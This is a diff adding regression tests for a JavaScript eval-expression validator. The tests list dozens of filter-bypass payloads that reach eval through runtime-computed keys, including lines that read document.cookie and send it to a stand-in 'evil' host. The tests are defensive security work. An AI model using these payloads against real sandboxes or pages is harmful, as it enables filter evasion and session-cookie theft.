@@ -301,3 +301,163 @@ describe('AC3c: FIX-1/FIX-2 regression — legit reads are not over-rejected', (
     expect(() => validateEvalExpression(expression)).not.toThrow()
   })
 })
+
+/**
+ * Fix round 4 (R3-P0). Round 3 wired constant folding into `memberName()`, which
+ * closes every key that folds to a constant string. It does NOT close a key that
+ * is only computable at RUNTIME (`String.fromCharCode(...)`, `[...].join('')`,
+ * `atob(...)`, `.slice()`, …): `memberName()` returns `undefined` ("unverifiable")
+ * and every value-position branch treats `undefined` as "not a literal, allow".
+ *
+ * Measured on HEAD `4d7b12885f` (vm sandbox, real eval, document.cookie seeded):
+ *   ["globalThis.PWN=document.cookie"].forEach(window[String.fromCharCode(101,118,97,108)])
+ *     -> PWN="SESSION=RESIDUAL-SECRET-999"          (cookie read)
+ *   ["fetch('https://evil/?d='+document.cookie)"].forEach(window[["e","v","a","l"].join("")])
+ *     -> FETCH:https://evil/?d=SESSION=RESIDUAL-SECRET-999  (exfiltration)
+ *
+ * Root cause is the `undefined` sentinel: it means "dynamic key" (legit read,
+ * `data[key]`) AND "unverifiable key" (must not be trusted in a value position).
+ * The fix keeps `undefined` for reads but denies an unverifiable computed key
+ * wherever the member VALUE is consumed (callback/argument/property value/…).
+ *
+ * These cases MUST fail on the pre-fix code (recorded: 34 ACCEPT / 3 REJECT).
+ */
+describe('AC4c: R3-P0 residual — runtime-computed keys in VALUE position are rejected', () => {
+  it.each([
+    // the four measured residual payloads
+    [`[1].map(window[String.fromCharCode(101,118,97,108)])`, 'fromCharCode key as a callback'],
+    [`["globalThis.PWN=document.cookie"].forEach(window[String.fromCharCode(101,118,97,108)])`, 'fromCharCode key + cookie read'],
+    [`[1].map(window[["e","v","a","l"].join("")])`, 'Array.join key as a callback'],
+    [`["fetch(\\"https://evil/?d=\\"+document.cookie)"].forEach(window[["e","v","a","l"].join("")])`, 'Array.join key + exfiltration'],
+    // other runtime key builders (same class: not constant-foldable)
+    [`[1].map(window[String.fromCodePoint(101,118,97,108)])`, 'fromCodePoint key'],
+    [`[1].map(window[atob('ZXZhbA==')])`, 'atob key'],
+    [`[1].map(window[decodeURIComponent('ev%61l')])`, 'decodeURIComponent key'],
+    [`[1].map(window['ev'.concat('al')])`, 'String.concat key'],
+    [`[1].map(window['xeval'.slice(1)])`, 'slice key'],
+    [`[1].map(window['xevalx'.substring(1,5)])`, 'substring key'],
+    [`[1].map(window['EVAL'.toLowerCase()])`, 'toLowerCase key'],
+    [`[1].map(window['eval'.toUpperCase().toLowerCase()])`, 'case round-trip key'],
+    [`[1].map(window['e,v,a,l'.split(',').join('')])`, 'split + join key'],
+    [`[1].map(window['eval'.match(/./g).join('')])`, 'match + join key'],
+    [`[1].map(window[String.fromCharCode(101)+'val'])`, 'fromCharCode + concatenation'],
+    [`[1].map(window[(101).toString(36)+'val'])`, 'numeric toString key'],
+    [`[1].map(window[String.raw({raw:['eval']})])`, 'String.raw call key'],
+    [`[1].map(window[\`ev\${String.fromCharCode(97)}l\`])`, 'template with a runtime interpolation'],
+    [`[1].map(window[['e','v','a','l'].join('')])`, 'Array.join key (bare array)'],
+    [`[1].map(window[(['e','v','a','l']).join('')])`, 'Array.join key (parenthesised)'],
+    // the same runtime key in every other value position
+    [`["p"].forEach(window[String.fromCharCode(101,118,97,108)])`, 'forEach callback'],
+    [`[1].filter(window[String.fromCharCode(101,118,97,108)])`, 'filter callback'],
+    [`[1].reduce(window[String.fromCharCode(101,118,97,108)])`, 'reduce callback'],
+    [`Promise.resolve(1).then(window[String.fromCharCode(101,118,97,108)])`, 'promise continuation'],
+    [`[1].map([window[String.fromCharCode(101,118,97,108)]][0])`, 'array element'],
+    [`[1].map((0, window[String.fromCharCode(101,118,97,108)]))`, 'sequence expression'],
+    [`[1].map(true ? window[String.fromCharCode(101,118,97,108)] : null)`, 'conditional consequent'],
+    [`[1].map(window[String.fromCharCode(101,118,97,108)] || null)`, 'logical expression'],
+    [`[1].map(x => window[String.fromCharCode(101,118,97,108)]).at(0)('p')`, 'arrow return value'],
+    [`Math.max(...[window[String.fromCharCode(101,118,97,108)]])`, 'spread argument'],
+    [`[1].map(\`\${window[String.fromCharCode(101,118,97,108)]}\`)`, 'template interpolation'],
+    [`[1].map(window[String.fromCharCode(101,118,97,108)].name)`, 'runtime key inside a member chain'],
+    [`[1].map(window[["e","v","a","l"].join("")].name)`, 'join key inside a member chain'],
+    // dangerous property names reached through a runtime key
+    [`["k"].forEach(localStorage[String.fromCharCode(115,101,116,73,116,101,109)])`, 'setItem via runtime key'],
+    [`["https://evil"].forEach(location[String.fromCharCode(97,115,115,105,103,110)])`, 'location.assign via runtime key'],
+    [`[1].map(document[String.fromCharCode(119,114,105,116,101)])`, 'document.write via runtime key'],
+  ])('AC4c rejects %s (%s)', (expression) => {
+    expectEvalPolicyError(expression)
+  })
+})
+
+/**
+ * R3-P0 sibling channels (same "unverifiable computed key" root cause, three
+ * non-callback consumers that round 3 left open):
+ *   - a computed ObjectPattern KEY (`({[window[k]]: x}) => …`) renames a member;
+ *   - a binding-pattern DEFAULT (`((f = window[k]) => …)()`) aliases a member;
+ *   - `Reflect.get(obj, k)` hands the member VALUE straight back out.
+ * `Reflect.get(o, key)` / `({[key]: 1})` / `(({[key]: x}) => x)(obj)` stay allowed
+ * (AC3e) — the denial is keyed on the computed key being a member expression
+ * whose own name cannot be resolved, not on computed keys in general.
+ */
+describe('AC4d: R3-P0 sibling channels — computed pattern keys, pattern defaults, reflective reads', () => {
+  it.each([
+    [`(({[window[String.fromCharCode(101,118,97,108)]]: x}) => ["p"].forEach(x))(window)`, 'ObjectPattern computed key from a runtime-key member'],
+    [`(({[window[["e","v","a","l"].join("")]]: x}) => ["p"].forEach(x))(window)`, 'ObjectPattern computed key from Array.join'],
+    [`(({[window['ev'+'al']]: x}) => ["p"].forEach(x))(window)`, 'ObjectPattern computed key from a folded member'],
+    [`((f = window[String.fromCharCode(101,118,97,108)]) => ["p"].forEach(f))()`, 'pattern default from a runtime-key member'],
+    [`((f = window[["e","v","a","l"].join("")]) => ["p"].forEach(f))()`, 'pattern default from Array.join'],
+    [`((f = window['ev'+'al']) => ["p"].forEach(f))()`, 'pattern default from a folded member'],
+    [`[1].map(Reflect.get(window, String.fromCharCode(101,118,97,108)))`, 'Reflect.get with a runtime key in value position'],
+    [`[1].map(Reflect.get(window, ["e","v","a","l"].join("")))`, 'Reflect.get with an Array.join key in value position'],
+    [`[1].map(Reflect.get(window, ...["eval"]))`, 'Reflect.get with a spread literal name'],
+    [`[1].map(Reflect.get(window, ...["ev"+"al"]))`, 'Reflect.get with a spread folded name'],
+    [`[1].map(Reflect.get(window, ...[String.fromCharCode(101,118,97,108)]))`, 'Reflect.get with a spread runtime name'],
+    [`[1].map(window?.[String.fromCharCode(101,118,97,108)])`, 'optional chain + runtime key'],
+    [`[1].map(window[({x:'eval'}).x])`, 'runtime key read from an object property'],
+    [`[1].map(window[this.k])`, 'runtime key read from `this`'],
+    [`[1].map(window[[...['e','v','a','l']].join('')])`, 'runtime key from a spread array join'],
+    [`[1].map(window[true ? 'eval' : String.fromCharCode(101,118,97,108)])`, 'runtime key in a conditional branch'],
+    [`[1].map(window[(0, String.fromCharCode(101,118,97,108))])`, 'runtime key inside a sequence'],
+    [`[1].map(window[Number('1')])`, 'runtime key from a Number() call'],
+    [`[1].map(window[String.fromCharCode.call(null,101,118,97,108)])`, 'runtime key via Function.call'],
+    [`["p"].forEach(window[[...['e','v','a','l']].join('')])`, 'spread-array join key as a callback'],
+  ])('AC4d rejects %s (%s)', (expression) => {
+    expectEvalPolicyError(expression)
+  })
+})
+
+/**
+ * Over-rejection guard for R3-P0. The denied class is exactly "a computed key
+ * that is itself a MEMBER EXPRESSION whose name cannot be resolved". Every
+ * documented legit dynamic read below stays allowed: plain `data[key]` /
+ * `window[key]`, member bases, numeric/parameter keys, computed object keys and
+ * destructuring keys built from identifiers, and `Reflect.get(o, key)`.
+ */
+describe('AC3e: R3-P0 regression — legit dynamic reads and computed keys stay allowed', () => {
+  it.each([
+    // the AC3 core list (must not regress)
+    `data[key]`,
+    `window.__NEXT_DATA__`,
+    `localStorage.getItem("t")`,
+    `fetch("https://x")`,
+    `readText("#a")`,
+    `[1,2].map(n => n * 2)`,
+    `fetch("u").then(r => r.text())`,
+    `document.body.innerText`,
+    `({a:1})["a"]`,
+    `[1,2,3][0]`,
+    `[() => 1].map(f => f())`,
+    `Object.getPrototypeOf({})`,
+    `Reflect.has({},"x")`,
+    `[[1]].map(([a]) => a)`,
+    // dynamic reads in value position
+    `[1].map(data[key])`,
+    `[1].map(data[n])`,
+    `[1].map(window[key])`,
+    `fetch('u', { body: data[key] })`,
+    `[1,2].map(n => data[n])`,
+    `Object.keys(o).map(k => o[k])`,
+    `Object.entries(data).map(([k, v]) => k)`,
+    `obj[key].items[0]`,
+    `data[key].foo`,
+    `data["a"+"b"]`,
+    `data[0]`,
+    `data[i]`,
+    `window[0]`,
+    `arr[idx]`,
+    `Math.max(...[data[key]])`,
+    '[1].map(`${data[key]}`)',
+    // computed keys / destructuring built from identifiers
+    `({[key]: 1})`,
+    `(({[key]: x}) => x)(obj)`,
+    `(({[key]: x}) => [1].map(x))(obj)`,
+    `((f = data[key]) => f)()`,
+    `Reflect.get(o, key)`,
+    `[1].map(Reflect.get(o, key))`,
+    `((k) => window[k])('__NEXT_DATA__')`,
+    `window['__NEXT'+'_DATA__']`,
+    `document['querySel'+'ector']('#a')`,
+  ])('AC3e accepts %s', (expression) => {
+    expect(() => validateEvalExpression(expression)).not.toThrow()
+  })
+})
